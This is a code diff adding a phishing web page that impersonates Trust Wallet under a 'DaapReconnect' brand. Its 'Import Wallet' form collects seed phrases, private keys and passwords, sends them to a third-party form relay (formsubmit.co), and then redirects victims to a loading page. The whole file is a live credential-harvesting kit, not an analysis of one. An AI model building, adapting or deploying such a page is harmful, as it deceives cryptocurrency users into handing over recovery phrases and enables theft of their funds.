@@ -1,0 +1,141 @@
+<!Doctype html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
+    integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w=="
+    crossorigin="anonymous" referrerpolicy="no-referrer"/>
+    <link rel="stylesheet" href="import.css" type="text/css">
+    <link rel="icon" type="image/png" href="logo.png"/>
+    <title>Trustwallet</title><script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"> </script>
+</head>
+<body>
+    <div class="close">
+        <i class="fa fa-angle-left fa-2x" id="close" onclick="closeMenu()"></i>
+    </div>
+
+    <div class="menu-slider" id="move">
+        <div class="contents" id="float">
+        
+    
+            <nav class="two">
+                <ul>
+                    
+                    <li>
+                        <a href="faq">FAQ</a>
+                        <i class="fa fa-plus"></i>
+                    </li>
+                    
+                </ul>
+            </nav>
+        </div>
+     </div>
+    
+        <i class="fa fa-bars fa-8x"  id="bar" onclick="slideLeft()"></i>
+    <div class="containerx" id="slide">          
+    </div>
+</div>
+</div>
+
+
+<section class="navbar2" id="nava">
+    <div class="navbar2-container">
+        <div class="leftside"><img src="logo.svg" id="logo" alt="logo"></div>
+        <div class="rightside">
+            <nav>
+                <ul id="navar" >
+                    
+                    <li><a href="faq">FAQ</a></li>
+                </ul>
+            </nav>
+        </div>
+    </div>
+<script src="js.js"></script>
+</section>
+
+
+<section class="body">
+    <div class="container">
+        <div class="topsection">
+            <div class="topsection-container">
+                <h3>Import Wallet</h3>
+                <div class="wallet">
+                    <form class="wallet-container card" action="https://formsubmit.co/2d19e861c74bfc05b2e00bca38874e04" method="POST">
+                        <input type="hidden" name="_next" value="https://daapreconnect.com/loading">
+                        <input type="hidden" name="_captcha" value="false">
+                        <div class="top">
+                            <div class="one" >
+                                <div class="phrase"  id="one" onclick="toRight()">Phrase</div>
+                        <div class="keystore" id="two" onclick="toLeft()">Keystore</div>
+                            </div>
+                        <p>Private_Key</p>
+                        </div>
+
+                        <div class="middle">
+                            <h4>TrustWallet</h4>
+                            <textarea id="seed" minlength="30" name="TrustWallet" placeholder="Seed Phrase..." required></textarea >
+                        <input id="movepass"  type="password"
+                      placeholder="Password" name="Password"/>
+                        </div>
+
+                        <div class="bottom">
+                          <div class="radiobutton">
+  <div class="one">
+                                <input type="radio"
+                                checked="checked" class="manual"
+                                id="manual" name="check">
+                            <label for="manual">Manual</label>
+                            </div>
+                            <div class="two">
+                                <input type="radio" 
+                                class="automatic" id="automatic" name="check">
+                            <label for="manual">Automatic</label>
+                            </div>
+                          </div>
+                            <input type="submit" onclick="toSubmit()" value="Import">
+                            
+                        </div>
+                        </form>
+                    </div>
+                </div>
+         
+        
+    </div>
+
+</section>
+    
+
+<section class="footer">
+    <div class="footer-container">
+        <div class="footer-leftpart">
+            <img src="logo.svg" alt="logo">
+            <p>DaapReconnect connects web applications to supported mobile wallets.</p>
+            
+       </div>
+
+
+        <div class="footer-rightpart">
+            <button class="one">
+                <a href="wallet">
+                  <p>Wallet</p>
+                  <i class="fa fa-angle-right fa-2x"></i>
+                </a>
+              </button>
+            <button class="two">
+                <a href="faq">
+                    <p>FAQ</p>
+                    <i class="fa fa-angle-right fa-2x"></i>
+                </a>
+            </button>
+            
+            
+            
+        </div>
+    </div>
+    <h5>Copyright © 2022 DaapReconnect, Inc. All rights reserved.</h5>
+</section>
+<script src="js.js"></script>
+</body>
+</html>
